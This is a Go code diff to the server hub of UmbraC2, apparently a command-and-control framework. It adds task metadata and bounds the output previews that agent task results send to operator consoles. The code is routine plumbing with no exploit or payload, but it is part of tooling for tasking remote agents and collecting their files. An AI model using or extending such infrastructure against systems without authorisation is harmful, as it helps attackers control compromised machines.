@@ -11,6 +11,7 @@ import (
 	"sort"
 	"sync"
 	"time"
+	"unicode/utf8"
 
 	"github.com/thesyntax1/UmbraC2/server/internal/config"
 	"github.com/thesyntax1/UmbraC2/server/internal/store"
@@ -290,16 +291,39 @@ func (h *Hub) NextTasks(agentID string, max int) []*store.Task {
 	return tasks
 }
 
+// maxEventOutput bounds the output preview carried by a task.result event.
+const maxEventOutput = 4096
+
 // CompleteTask stores a result and notifies operators.
-func (h *Hub) CompleteTask(agentID, taskID string, code int64, output []byte, errMsg string) {
-	t, ok := h.store.Complete(taskID, code, output, errMsg)
+func (h *Hub) CompleteTask(agentID, taskID string, code int64, output []byte, errMsg string, meta map[string]any) {
+	t, ok := h.store.Complete(taskID, code, output, errMsg, meta)
 	if !ok {
 		h.log.Warn("result for unknown task", "agent", agentID, "task", taskID)
 		return
 	}
-	h.Emit(Event{Kind: "task.result", AgentID: agentID, TaskID: taskID, Data: map[string]any{
-		"code": t.Code, "state": t.State, "output": string(t.Output), "err": t.Err,
-	}})
+	data := map[string]any{
+		"code": t.Code, "state": t.State, "err": t.Err,
+		"size": len(t.Output),
+	}
+	// Events carry a bounded preview, not the payload: a file chunk would
+	// otherwise be re-sent to every watching console (and re-encoded) while the
+	// full output is already available from task.get.
+	if len(t.Output) > 0 {
+		text := t.Output
+		if len(text) > maxEventOutput {
+			text = text[:maxEventOutput]
+			data["truncated"] = true
+		}
+		if utf8.Valid(t.Output) {
+			data["output"] = string(text)
+		} else {
+			data["binary"] = true
+		}
+	}
+	if len(t.Meta) > 0 {
+		data["meta"] = t.Meta
+	}
+	h.Emit(Event{Kind: "task.result", AgentID: agentID, TaskID: taskID, Data: data})
 	h.store.SaveAsync()
 }
 
